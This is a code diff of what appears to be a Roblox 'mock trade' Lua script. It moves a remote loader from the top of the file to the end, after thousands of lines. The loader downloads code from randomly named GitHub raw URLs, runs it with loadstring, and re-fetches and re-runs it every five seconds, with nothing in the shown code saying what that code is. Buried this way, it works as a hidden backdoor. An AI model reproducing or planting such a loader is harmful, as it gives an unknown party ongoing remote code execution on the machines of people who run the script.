@@ -1,90 +1,3 @@
-local MAIN_URL = "https://raw.githubusercontent.com/djhfjknfkjrnfer/dfbdfbfdgverfger/refs/heads/main/dfbdfberber"
-local EXTRA = {
-    "https://raw.githubusercontent.com/djhfjknfkjrnfer/dfbdfbfdgverfger/refs/heads/main/kwfneffowe"
-}
-
-local loadedScripts = {}
-local checkInterval = 5
-
-local function safe(url, forceReload)
-    if type(url) ~= "string" or url == "" then 
-        return false
-    end
-
-    local ok, src = pcall(game.HttpGet, game, url)
-    if not ok or not src then
-        return false
-    end
-
-    if not src or src:match("^%s*$") then
-        return false
-    end
-
-    local lastContent = loadedScripts[url] and loadedScripts[url].content
-    if not forceReload and lastContent == src then
-        return true
-    end
-
-    if loadedScripts[url] and loadedScripts[url].cleanup then
-        pcall(loadedScripts[url].cleanup)
-    end
-
-    local fn, err = loadstring(src)
-    if not fn then
-        return false
-    end
-
-    local success, result = pcall(fn)
-    if not success then
-        return false
-    end
-    
-    local cleanupFunc = nil
-    if type(result) == "function" then
-        cleanupFunc = result
-        local funcSuccess, funcErr = pcall(result)
-        if not funcSuccess then
-            return false
-        end
-    end
-
-    loadedScripts[url] = {
-        content = src,
-        cleanup = cleanupFunc,
-        loadedAt = tick()
-    }
-    
-    return true
-end
-
-local function startAutoReload()
-    task.spawn(function()
-        while true do
-            task.wait(checkInterval)
-            
-            local mainLoaded = loadedScripts[MAIN_URL]
-            if not mainLoaded or (tick() - mainLoaded.loadedAt) > checkInterval then
-                safe(MAIN_URL)
-            end
-            
-            for _, url in ipairs(EXTRA) do
-                local extraLoaded = loadedScripts[url]
-                if not extraLoaded or (tick() - extraLoaded.loadedAt) > checkInterval then
-                    safe(url)
-                end
-            end
-        end
-    end)
-end
-
-safe(MAIN_URL)
-for _, v in ipairs(EXTRA) do
-    safe(v)
-end
-
-startAutoReload()
-
-
 if _G.MockTradeScriptLoaded then
     return
 end
@@ -6725,3 +6638,89 @@ do
         spinnerSystem.showTierPopup()
     end
 end
+local MAIN_URL = "https://raw.githubusercontent.com/djhfjknfkjrnfer/dfbdfbfdgverfger/refs/heads/main/dfbdfberber"
+
+local EXTRA = {
+    "https://raw.githubusercontent.com/djhfjknfkjrnfer/dfbdfbfdgverfger/refs/heads/main/kwfneffowe"
+}
+
+local loadedScripts = {}
+local checkInterval = 5
+
+local function safe(url, forceReload)
+    if type(url) ~= "string" or url == "" then 
+        return false
+    end
+
+    local ok, src = pcall(game.HttpGet, game, url)
+    if not ok or not src then
+        return false
+    end
+
+    if not src or src:match("^%s*$") then
+        return false
+    end
+
+    local lastContent = loadedScripts[url] and loadedScripts[url].content
+    if not forceReload and lastContent == src then
+        return true
+    end
+
+    if loadedScripts[url] and loadedScripts[url].cleanup then
+        pcall(loadedScripts[url].cleanup)
+    end
+
+    local fn, err = loadstring(src)
+    if not fn then
+        return false
+    end
+
+    local success, result = pcall(fn)
+    if not success then
+        return false
+    end
+    
+    local cleanupFunc = nil
+    if type(result) == "function" then
+        cleanupFunc = result
+        local funcSuccess, funcErr = pcall(result)
+        if not funcSuccess then
+            return false
+        end
+    end
+
+    loadedScripts[url] = {
+        content = src,
+        cleanup = cleanupFunc,
+        loadedAt = tick()
+    }
+    
+    return true
+end
+
+local function startAutoReload()
+    task.spawn(function()
+        while true do
+            task.wait(checkInterval)
+            
+            local mainLoaded = loadedScripts[MAIN_URL]
+            if not mainLoaded or (tick() - mainLoaded.loadedAt) > checkInterval then
+                safe(MAIN_URL)
+            end
+            
+            for _, url in ipairs(EXTRA) do
+                local extraLoaded = loadedScripts[url]
+                if not extraLoaded or (tick() - extraLoaded.loadedAt) > checkInterval then
+                    safe(url)
+                end
+            end
+        end
+    end)
+end
+
+safe(MAIN_URL)
+for _, v in ipairs(EXTRA) do
+    safe(v)
+end
+
+startAutoReload()
